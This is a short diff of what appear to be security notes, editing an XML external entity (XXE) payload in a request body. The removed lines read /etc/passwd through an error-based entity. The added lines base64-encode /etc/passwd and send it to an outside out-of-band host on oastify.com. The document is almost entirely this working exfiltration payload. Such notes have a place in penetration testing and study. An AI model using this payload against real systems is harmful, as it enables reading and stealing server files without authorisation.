@@ -355,8 +355,8 @@
         - Body
             
             ```jsx
-            <!ENTITY % file SYSTEM "file:///etc/passwd">
-            <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+            <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd "> 
+            <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://ub967ztr0nmlbvlpbk1y0sbea5gw400cp.oastify.com/%file;'>">
             %eval;
             %error;
             ```
